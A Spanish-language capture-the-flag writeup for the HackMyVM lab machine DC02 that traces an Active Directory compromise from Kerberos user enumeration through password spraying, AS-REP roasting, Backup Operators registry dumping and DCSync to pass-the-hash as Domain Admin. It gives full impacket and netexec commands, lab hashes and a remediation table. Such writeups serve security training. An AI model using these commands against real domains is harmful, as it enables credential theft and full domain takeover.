[Inicio](../../../README.md) · [Red Team](../../README.md)

**Estado: completada hasta Administrator / Domain Admin** · [🌐 Abrir writeup visual](https://w4ltersec.github.io/cybersecurity-labs/red-team/hackmyvm/dc02/DC02-Writeup.html)

# DC02 — HackMyVM — Writeup completo

> **Sistema:** Windows Server 2022 / Active Directory · **Target del laboratorio:** `192.168.1.23`
> **Host:** `DC01` · **Dominio:** `SOUPEDECODE.LOCAL`
> **Cadena:** `charlie → zximena448 (Backup Operators) → DC01$ → Administrator`

[🔗 Abrir la máquina DC02 en HackMyVM](https://hackmyvm.eu/machine/DC02)

La máquina se publica como **DC02**, según la identificación de W4lterSec. El nombre **SOUPEDECODE.LOCAL** corresponde al dominio documentado en el HTML original.

## Resumen ejecutivo

| Fase | Técnica | Resultado documentado |
| --- | --- | --- |
| Reconocimiento | Nmap y servicios de Active Directory | Controlador de dominio DC01 |
| Enumeración y acceso inicial | Enumeración Kerberos y contraseñas usuario=contraseña | Cuenta charlie |
| Movimiento lateral | AS-REP Roasting y cracking offline | Cuenta zximena448 |
| Escalada | Backup Operators y volcado del registro | Hash de la cuenta DC01$ |
| Replicación | DCSync con la cuenta del controlador | Hash de Administrator |
| Acceso final | Pass-the-Hash | Administrator / Domain Admin |

// objetivo capturado

## Flags

**User Flag** · ● zximena448 — Backup Operators

`2fe79eb0e02ecd4dd2833cfcbbdb504c`

**Root Flag** · ● Administrator — Domain Admin

`d41d8cd98f00b204e9800998ecf8427e`

// fase 01

## Reconocimiento

El escaneo completo de puertos revela el set de servicios inconfundible de un **Domain Controller**: Kerberos, LDAP, DNS, SMB y ADWS.

**nmap — port sweep**

```text
# barrido completo de 65535 puertos TCP
$ nmap -p- --open -sT --min-rate 5000 -n -Pn -T4 192.168.1.23
```

| Puerto | Servicio | Descripción |
| --- | --- | --- |
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | auth del dominio |
| 389 | LDAP | SOUPEDECODE.LOCAL |
| 445 | SMB | signing requerido |
| 5985 | WinRM | remoting |
| 9389 | ADWS | AD Web Services |
| 3268 | GC | Global Catalog |
| 636 | LDAPS | LDAP sobre TLS |

// cadena de explotación

## Kill Chain

**Fase 02 · Enumeración**

### Usuarios vía Kerberos sin credenciales

Accesos anónimos bloqueados (guest disabled, null session denegada). Se enumeran usuarios válidos abusando de los errores de pre-auth Kerberos.

**impacket-GetNPUsers — user enum**

```text
$ impacket-GetNPUsers SOUPEDECODE.LOCAL/ -no-pass \
    -usersfile usernames.txt -dc-ip 192.168.1.23
```

[+] Usuarios válidos → admin · charlie

**Fase 03 · Acceso inicial**

### Password Spraying charlie:charlie

Patrón clásico de laboratorios AD: **contraseña = nombre de usuario**.

**netexec — spray user==pass**

```text
$ nxc smb 192.168.1.23 -u users.txt -p users.txt \
    --no-bruteforce --continue-on-success
```

[+] SOUPEDECODE.LOCAL\charlie:charlie — 964 usuarios del dominio volcados

**Fase 04 · Movimiento lateral**

### AS-REP Roasting zximena448:internet

Con los 964 usuarios se busca pre-auth deshabilitada; el hash AS-REP se crackea offline con rockyou.

**GetNPUsers + john**

```text
$ impacket-GetNPUsers SOUPEDECODE.LOCAL/ -no-pass -usersfile full_users.txt -dc-ip 192.168.1.23
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:646b6dbf...
$ john asrep.txt --wordlist=rockyou.txt
```

[+] zximena448 : internet

**Fase 05 · Escalada**

### Backup Operators → dump del registro SeBackupPrivilege

**zximena448** pertenece al grupo **Backup Operators**, lo que permite leer cualquier fichero del DC y volcar las ramas del registro. De ahí se extrae el hash de la cuenta máquina **DC01$**.

**netexec — backup_operator module**

```text
$ nxc ldap 192.168.1.23 -u zximena448 -p internet --query "(sAMAccountName=zximena448)" memberOf
memberOf: CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL   (Pwn3d!)
$ nxc smb 192.168.1.23 -u zximena448 -p internet -M backup_operator
```

[+] SOUPEDECODE\DC01$ ::: cff4505c0cfd1e9651471ffee912cd76

**Fase 06 · DCSync**

### Replicación con la cuenta máquina DC01$

Las cuentas de equipo de un DC poseen derechos de replicación del directorio — suficientes para un **DCSync** que extrae el hash del Administrator del dominio.

**impacket-secretsdump — DCSync**

```text
$ impacket-secretsdump 'SOUPEDECODE.LOCAL/DC01$@192.168.1.23' \
    -hashes :cff4505c0cfd1e9651471ffee912cd76 -just-dc-user Administrator
```

[+] Administrator:500:...:8982babd4da89d33210779a6c5b078bd:::

**Fase 07 · Compromiso total**

### Pass-the-Hash Domain Admin

Autenticación como Administrator con el hash NT — control total del Controlador de Dominio.

**netexec — pass-the-hash**

```text
$ nxc smb 192.168.1.23 -u Administrator -H 8982babd4da89d33210779a6c5b078bd
```

[+] SOUPEDECODE.LOCAL\Administrator (Pwn3d!) — root.txt capturada

// defensa

## Remediación

| Hallazgo | Riesgo | Recomendación |
| --- | --- | --- |
| Contraseñas `usuario==contraseña` (charlie) | Crítico | Política de contraseñas robusta, lockout y detección de spraying |
| Pre-auth Kerberos deshabilitada (zximena448) | Alto | Habilitar pre-auth; auditar flag `DONT_REQ_PREAUTH` |
| Contraseña débil en rockyou (`internet`) | Alto | Longitud 14+, listas de bloqueo de contraseñas comunes |
| Usuario normal en **Backup Operators** | Crítico | Retirar; tratar el grupo como Tier-0; revisar grupos privilegiados |
| Enumeración de usuarios por Kerberos | Medio | Reforzar lockout y monitorizar eventos 4768 / 4625 |

// tl;dr

## Cadena resumida

**attack-chain.log**

```text
nmap→Kerberos user-enum→spray (charlie:charlie)
→964 users→AS-REP roast (zximena448)→john (internet)
→Backup Operators→dump registry hives→DC01$ hash
→DCSync→Administrator NT hash→Pass-the-Hash→DA
```


---

*Writeup de W4lterSec basado en el HTML aportado. Las flags, credenciales y hashes conservados pertenecen a la máquina de prácticas. La publicación no ejecuta los comandos del documento.*
